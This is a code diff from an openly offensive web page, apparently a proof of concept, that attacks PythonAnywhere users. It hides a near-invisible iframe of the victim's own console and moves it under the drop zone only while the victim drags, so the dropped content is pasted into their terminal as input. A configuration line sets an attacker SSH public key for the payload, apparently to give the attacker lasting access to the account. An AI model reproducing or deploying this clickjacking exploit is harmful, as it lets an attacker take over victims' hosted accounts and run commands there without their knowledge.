@@ -65,27 +65,28 @@ p { color: #aaa; margin-bottom: 30px; }
 
 /*
   HIDDEN CONSOLE IFRAME
-  - Loads PythonAnywhere's embedded console
-  - Positioned EXACTLY behind the drop zone
-  - Transparent so victim can't see it
-  - Console spawns in victim's account (SameSite=None cookie)
-  - hterm terminal accepts drag-drop as paste input
+  Starts off-screen so it doesn't block anything.
+  Moves over the drop zone ONLY when victim starts dragging.
 */
 .console-iframe {
   position: fixed;
-  /* Position to cover the drop zone area */
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 100%;
-  opacity: 0.0001; /* Nearly invisible but still receives events */
-  z-index: 10;     /* Above the visible page */
+  top: -9999px;
+  left: -9999px;
+  width: 1px;
+  height: 1px;
+  opacity: 0.0001;
+  z-index: -1;
   border: none;
-  pointer-events: none; /* Don't block normal interaction */
+  pointer-events: none;
 }
 
-/* When dragging, enable pointer events on the iframe so the drop lands on it */
+/* When dragging: iframe covers the drop zone so the drop lands on the terminal */
 .console-iframe.active {
+  top: 0 !important;
+  left: 0 !important;
+  width: 100% !important;
+  height: 100% !important;
+  z-index: 10 !important;
   pointer-events: all !important;
 }
 </style>
@@ -132,7 +133,7 @@ p { color: #aaa; margin-bottom: 30px; }
 // ══════════════════════════════════════════════════════════
 // CONFIGURATION — Replace with YOUR attacker SSH public key
 // ══════════════════════════════════════════════════════════
-var ATTACKER_KEY = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGnl5m2NP227Tji71XUNv4Pd3TYfrl3HPpfj3K6t1kSJ AttackerAccount@green-liveconsole7';
+var ATTACKER_KEY = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKnNMlgV0yv5w5h2p4QzGgmbj8k6p/pfVM6bLc0oTqV8 AttackerAccount@green-liveconsole8';
 
 // ══════════════════════════════════════════════════════════
 // BUILD THE PAYLOAD
